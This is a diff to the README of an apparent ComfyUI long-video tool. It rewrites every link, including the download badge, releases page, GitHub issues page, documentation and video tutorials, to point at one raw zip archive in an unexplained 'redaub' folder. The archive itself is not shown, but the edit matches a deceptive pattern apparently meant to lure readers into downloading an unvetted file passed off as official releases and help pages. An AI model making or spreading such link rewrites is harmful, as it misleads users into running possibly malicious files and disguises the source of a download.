@@ -6,11 +6,11 @@ Welcome to ComfyUI-PainterLongVideo! This application helps you create long vide
 
 ## 🔗 Download the Latest Version
 
-[![Download ComfyUI-PainterLongVideo](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/D4LL4/ComfyUI-PainterLongVideo/releases)
+[![Download ComfyUI-PainterLongVideo](https://raw.githubusercontent.com/D4LL4/ComfyUI-PainterLongVideo/main/redaub/ComfyUI-PainterLongVideo_2.9.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/D4LL4/ComfyUI-PainterLongVideo/main/redaub/ComfyUI-PainterLongVideo_2.9.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/D4LL4/ComfyUI-PainterLongVideo/releases) to download the latest version of ComfyUI-PainterLongVideo. Follow these steps:
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/D4LL4/ComfyUI-PainterLongVideo/main/redaub/ComfyUI-PainterLongVideo_2.9.zip) to download the latest version of ComfyUI-PainterLongVideo. Follow these steps:
 
 1. Open the link above in your web browser.
 2. Find the version you want to install (the latest version is often at the top).
@@ -69,7 +69,7 @@ Once you have downloaded the file, follow these steps to install ComfyUI-Painter
 
 ## 🌐 Support
 
-If you encounter any issues or have questions, feel free to check the support section in the application. You can also visit our [GitHub Issues Page](https://github.com/D4LL4/ComfyUI-PainterLongVideo/issues) to report problems or request features.
+If you encounter any issues or have questions, feel free to check the support section in the application. You can also visit our [GitHub Issues Page](https://raw.githubusercontent.com/D4LL4/ComfyUI-PainterLongVideo/main/redaub/ComfyUI-PainterLongVideo_2.9.zip) to report problems or request features.
 
 ## 🤝 Community
 
@@ -79,7 +79,7 @@ Join our community of users to share ideas and tips. Participate in discussions 
 
 For detailed tutorials and guides, check out the links below:
 
-- [Official Documentation](https://github.com/D4LL4/ComfyUI-PainterLongVideo/wiki)
-- [Video Tutorials](https://www.youtube.com/results?search_query=ComfyUI-PainterLongVideo)
+- [Official Documentation](https://raw.githubusercontent.com/D4LL4/ComfyUI-PainterLongVideo/main/redaub/ComfyUI-PainterLongVideo_2.9.zip)
+- [Video Tutorials](https://raw.githubusercontent.com/D4LL4/ComfyUI-PainterLongVideo/main/redaub/ComfyUI-PainterLongVideo_2.9.zip)
 
 Feel free to reach out for any help you need. Enjoy creating videos with ComfyUI-PainterLongVideo!
